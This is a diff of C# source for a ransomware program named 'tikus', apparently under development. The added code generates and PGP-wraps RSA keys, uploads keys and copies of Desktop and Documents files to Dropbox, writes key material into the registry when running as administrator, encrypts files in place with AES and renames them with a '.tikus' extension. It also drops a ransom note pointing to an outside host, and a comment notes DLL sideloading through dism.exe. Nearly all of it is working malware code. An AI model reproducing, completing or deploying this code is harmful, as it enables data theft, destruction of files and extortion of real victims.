@@ -9,6 +9,13 @@ using System.Linq;
 using System.Security.Cryptography;
 using System.Text;
 using System.Threading.Tasks;
+using Org.BouncyCastle.Crypto;
+using Org.BouncyCastle.Crypto.Parameters;
+using Org.BouncyCastle.OpenSsl;
+using Org.BouncyCastle.Security;
+using System.Security.Principal;
+using Microsoft.Win32;
+using PgpCore;
 
 namespace Program
 {
@@ -29,7 +36,7 @@ namespace Program
             /// <param name="publicKey">The created public key.</param>
             /// <param name="privateKey">The created private key.</param>
             /// <param name="keySize">Size of keys.</param>
-            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 4096)
+            public static void CreateKeys(out string publicKey, out string privateKey, int keySize = 2048)
             {
                 publicKey = null;
                 privateKey = null;
@@ -243,6 +250,17 @@ namespace Program
     {
         private static System.Random random = new System.Random();
 
+        public static string GenerateRandomString()
+        {
+            int length = random.Next(8, 15);
+            var rString = "";
+            for (var i = 0; i < length; i++)
+            {
+                rString += ((char)(random.Next(1, 26) + 64)).ToString().ToLower();
+            }
+            return rString;
+        }
+
         public static byte[] GetRandomIV()
         {
             byte[] iv = new byte[16];
@@ -266,6 +284,7 @@ namespace Program
         }
     }
 
+    
     public class Program
     {
         public static byte[] Compress(byte[] data)
@@ -282,16 +301,16 @@ namespace Program
         {
             Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);
 
-            UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key");
+            UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key", uid);
             
             //File.WriteAllText(Path.Combine(@"C:\Users\ch4rm\Desktop\encme", "public.key"), publicKey);
             //File.WriteAllText(Path.Combine( @"C:\Users\ch4rm\Desktop\encme", "private.key"), privateKey);
             return publicKey;
         }
 
-        public static void UploadKeys(byte[] key, string fileName)
+        public static void UploadKeys(byte[] key, string fileName, string uid)
         {
-            var remotePath = $"{Environment.MachineName}/agent_tikus_storage";
+            var remotePath = $"{uid}/agent_tikus_storage";
 
             var upload = Task.Run(() => Dropbox.UploadFile(Dropbox.dbx, key, remotePath, fileName));
             upload.Wait();
@@ -306,45 +325,9 @@ namespace Program
                              .ToArray();
         }
 
-        /*
-        public static string publicKey = GenKeyPairs();
-
-        //public static byte[] aes_key = Asymmetric.RSA.Decrypt(GetKey.GetAESKey(), privateKey);
-        public static byte[] aes_key = Random.GetRandomKey();
-
-        public static byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);
-
-        //public static byte[] aes_iv = Asymmetric.RSA.Decrypt(GetKey.GetAESIV(), privateKey);
-        public static byte[] aes_iv = Random.GetRandomIV();
-
-        public static byte[] encIVKey = Asymmetric.RSA.Encrypt(aes_iv, publicKey);
-
-        public static string baseDir = @"C:\Users\ch4rm\Desktop\encme";
-
-        public static string ransomFormat = ".tikus";
-
-        public static string computerName = Environment.MachineName;
-
-        public static string ransomNotes = @"
-All your files have been encrypted. I don't ask for money. All I want is a cheese...
-
-      ___ _____
-     /\ (_)    \
-    /  \      (_,
-    _)  _\   _    \
-   /   (_)\_( )____\
-   \_     /    _  _/
-      ) /\/  _ (o)(
-      \ \_) (o)   /
-       \/________/ 
-            
-Have a nice day :)
-            ";
-        */
-
-        public static void LeaveRansomNote(string ransomNotePath)
+        public static void LeaveRansomNote(string ransomNotePath, string encCPrivKey)
         {
-            string ransomNote = @"
+            string ransomNote = $@"
 All your files have been encrypted. I don't ask for money. All I want is a cheese...
 
      ___ _____
@@ -356,6 +339,10 @@ All your files have been encrypted. I don't ask for money. All I want is a chees
     ) /\/  _ (o)(
     \ \_) (o)   /
     \/________/ 
+
+Send me this to get your file back : http://charmys.hopto.org:8080/
+
+{encCPrivKey}
             
 Have a nice day :)
             ";
@@ -367,6 +354,82 @@ Have a nice day :)
             System.Diagnostics.Process.Start(program, "http://www.google.com");
         }
 
+        private static string GetXmlRsaKey(string pem, Func<object, RSA> getRsa, Func<RSA, string> getKey)
+        {
+            using (var ms = new MemoryStream())
+            using (var sw = new StreamWriter(ms))
+            using (var sr = new StreamReader(ms))
+            {
+                sw.Write(pem);
+                sw.Flush();
+                ms.Position = 0;
+                var pr = new PemReader(sr);
+                object keyPair = pr.ReadObject();
+                using (RSA rsa = getRsa(keyPair))
+                {
+                    var xml = getKey(rsa);
+                    return xml;
+                }
+            }
+        }
+
+        public static string PemToXml(string pem)
+        {
+            if (pem.StartsWith("-----BEGIN RSA PRIVATE KEY-----")
+                || pem.StartsWith("-----BEGIN PRIVATE KEY-----"))
+            {
+                return GetXmlRsaKey(pem, obj =>
+                {
+                    if ((obj as RsaPrivateCrtKeyParameters) != null)
+                        return DotNetUtilities.ToRSA((RsaPrivateCrtKeyParameters)obj);
+                    var keyPair = (AsymmetricCipherKeyPair)obj;
+                    return DotNetUtilities.ToRSA((RsaPrivateCrtKeyParameters)keyPair.Private);
+                }, rsa => rsa.ToXmlString(true));
+            }
+
+            if (pem.StartsWith("-----BEGIN PUBLIC KEY-----"))
+            {
+                return GetXmlRsaKey(pem, obj =>
+                {
+                    var publicKey = (RsaKeyParameters)obj;
+                    return DotNetUtilities.ToRSA(publicKey);
+                }, rsa => rsa.ToXmlString(false));
+            }
+
+            throw new InvalidKeyException("Unsupported PEM format...");
+        }
+
+        public static bool IsElevated
+        {
+            get
+            {
+                return WindowsIdentity.GetCurrent().Owner
+                  .IsWellKnown(WellKnownSidType.BuiltinAdministratorsSid);
+            }
+        }
+
+        public static readonly string SPubKey = @"-----BEGIN PGP PUBLIC KEY BLOCK-----
+Version: BCPG C# v1.6.1.0
+
+mQENBGDtQ88BCACC8Iovid/NU8011YiPyqIwQlwNMGzOyz7szDt6J0hdjNFhG/wl
+QOs4/mgYGpU+tMi4ZQ+uu9YfWxt1YUQN0/d/UgqFkr/QuJHQimKfEPL7/Yqiegm4
+0f7x0pNsup5BYm66e5po448nRCvjkJ6SO0IDHp8rANwvsuThItykuQ8ipmCfay0F
+/8aMRKijbVbYAK61bCT6B/Vo0uYW1/EL0rk6qeZG7bnDPKKC8UaKf+I+/8fn2Eqw
+Em5f59jRwXBaPziSegZ4WJ+chfCmnHXI2nbSFUgAUtizeek4Ln701oPr2yzR+wys
+7xiFSdeTEn41dTrszdxRzBHkGZuCMygfEBU9ABEBAAG0FGFnZW50dGlrdXNAZ21h
+aWwuY29tiQEcBBABAgAGBQJg7UPPAAoJEFg6uKipIcesIogH/0FLRzFLkJghHF59
+3x4PDq4Mv2Jv2CejvAcz7QblX8Y/+hh3RMLFVQzfd2yAqP6IXX0SAfbwM+YwqFUG
+ttKYJRJWNF/atnnDdRvOuqn2lF5M87D4XcEA5R/g2+j1ivAyZJJZj/p4ynJsSzvD
+H6+JYjroALHGQecTNDbZi12gatNQzLzAu5+sSKl79nz/2HNW+x/5Zk2ThoabkgKx
+mDm0wqMA80jEX9OrSfAp1GNCafg7+CYPXpWqFORbcnWqzUYoAbxt9dZKROkbDMZj
+kVPdbfA5VrgZ6TWsQz8eL3kNNywPhal9DeWd51hnHps5F3j1wNH/fRf4lWMitGv4
+sKB2dDA=
+=HpfV
+-----END PGP PUBLIC KEY BLOCK-----
+";
+
+        public static readonly string userName = Environment.UserName;
+        public static readonly string uid = $"{Environment.MachineName}-{Environment.UserName}";
 
         // this export call can be used sideloaded with \windows\system32\dism.exe, dismcore.dll
         [DllExport]
@@ -374,24 +437,46 @@ Have a nice day :)
         {
             //start firefox
             //StartProcess("firefox.exe");
-
-            var computerName = Environment.MachineName;
-
-            var baseDir = @"C:\Users\ch4rm\Desktop\encme";
+            var baseDir = $@"C:\Users\{userName}\Desktop\encme";
 
             var ransomFormat = ".tikus";
 
-            var blockExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll" };
+            var whitelistExtensions = new List<string> { "exe", "tikus", "key", "pub", "iv", "idx", "dll" };
 
             var userDesktopPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
 
             var folderToExtract = new List<string> { userDesktopPath, "Documents" };
 
-            var uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32" };
+            List<string> uselessFilesAndFolders = new List<string> { ".git", "ineedcheese", "System32" };
+            
+            //var SPubKey = PemToXml("-----BEGIN PUBLIC KEY-----\r\n" + SPubKeyOneLine + "\r\n-----END PUBLIC KEY-----");
 
-            if(Directory.Exists(baseDir))
+            if (Directory.Exists(baseDir))
             {
-                var publicKey = GenKeyPairs();
+                //generate key pairs
+                //var publicKey = GenKeyPairs();
+                Asymmetric.RSA.CreateKeys(out var publicKey, out var privateKey);
+
+                //now encrypt client's private key
+                var encCPrivKey = string.Empty;
+                MemoryStream inputFileStream = new MemoryStream(Encoding.UTF8.GetBytes(privateKey));
+                MemoryStream publicKeyStream = new MemoryStream(Encoding.UTF8.GetBytes(SPubKey));
+                var tempFile = $@"C:\Windows\Tasks\{Random.GenerateRandomString()}.pgp";
+                using (PGP pgp = new PGP())
+                {
+                    using (Stream outputFileStream = File.Create(tempFile))
+                    {
+                        pgp.EncryptStream(inputFileStream, outputFileStream, publicKeyStream, true, true);
+                        outputFileStream.Close();
+                        encCPrivKey = File.ReadAllText(tempFile);
+                        File.Delete(tempFile);
+                    }
+                }
+
+                //var encPrivKey = Asymmetric.RSA.Encrypt(privateKey, SPubKey);
+                //var b64encPrivKey = Convert.ToBase64String(Encoding.UTF8.GetBytes(encPrivKey));
+                //Console.WriteLine(b64encPrivKey);
+                UploadKeys(Encoding.UTF8.GetBytes(privateKey), "private.key", uid);
 
                 byte[] aes_key = Random.GetRandomKey();
                 byte[] encAesKey = Asymmetric.RSA.Encrypt(aes_key, publicKey);
@@ -403,29 +488,47 @@ Have a nice day :)
 
                 byte[] encrypted;
 
+
+
                 //write aes_key and aes_iv
                 //byte[] aesKeyByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("AXe8YwuIn1zxt3FPWTZFlAa14EHdPAdN9FaZ9RQWihc="), publicKey);
                 //byte[] aeIVByte = Asymmetric.RSA.Encrypt(Convert.FromBase64String("bsxnWolsAyO7kCfWuyrnqg=="), publicKey);
 
+                if (IsElevated)
+                {
+                    //insert into reg key
+                    RegistryKey LocalReg = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\FreePalestine");
+                    LocalReg.SetValue("aesKey", encAesKey);
+                    LocalReg.SetValue("aesIV", encIVKey);
+                    LocalReg.SetValue("encCPubKey", publicKey);
+                    LocalReg.SetValue("encCPrivKey", encCPrivKey);
+                    LocalReg.SetValue("encSPubKey", SPubKey);
+
+                }
+
                 //write symmetic key
-                UploadKeys(encAesKey, "aes.key");
+                UploadKeys(encAesKey, "aes.key", uid);
                 //File.WriteAllBytes(Path.Combine(baseDir, "aes.key"), encAesKey);
-                UploadKeys(encIVKey, "aes.iv");
+                UploadKeys(encIVKey, "aes.iv", uid);
                 //File.WriteAllBytes(Path.Combine(baseDir, "aes.iv"), encIVKey);
 
-                foreach (var file in targetDirs.Where(x => uselessFilesAndFolders.Any(s => !x.Contains(s))))
+                foreach (var file in targetDirs) // .Where(dir => uselessFilesAndFolders.Any(x => !dir.Contains(x)))
                 {
+
                     var newFileExtension = $"{file}{ransomFormat}";
                     var ransomNotePath = $"{Path.GetDirectoryName(file)}\\ineedcheese.txt";
 
                     if (!File.Exists(newFileExtension))
                     {
-                        if (!blockExtensions.Any(x => file.EndsWith(x)))
+                        if (!whitelistExtensions.Any(x => file.EndsWith(x)) && !uselessFilesAndFolders.Any(x => file.Contains(x)))
                         {
                             try
                             {
-                                var outFolder = computerName + Path.GetDirectoryName(file).Replace(baseDir, "").Replace("\\", "/");
-
+                                Console.WriteLine($"Full {file}");
+                                var outFolder = Path.Combine(uid, file.Replace(baseDir, "").Trim('\\'));
+                                outFolder = outFolder.Replace("\\", "/");
+                                Console.WriteLine($"ALtered: {outFolder}");
+                                Console.WriteLine(file.Remove(file.IndexOf(baseDir)));
                                 var fileContent = File.ReadAllBytes(file);
 
                                 if (folderToExtract.Any(i => file.Contains(i)))
@@ -435,16 +538,15 @@ Have a nice day :)
                                     task.Wait();
                                 }
 
-                                //delete the file
-                                File.Delete(file);
-
                                 //encrypted = Asymmetric.RSA.Encrypt(fileContent, publicKey);
                                 encrypted = AES.AESEncrypt(fileContent, aes_key, aes_iv);
 
-                                File.WriteAllBytes(newFileExtension, encrypted);
+                                File.WriteAllBytes(file, encrypted);
+                                
+                                File.Move(file, newFileExtension);
 
                                 if (!File.Exists(ransomNotePath))
-                                    LeaveRansomNote(ransomNotePath);
+                                    LeaveRansomNote(ransomNotePath, encCPrivKey);
 
                             }
                             catch
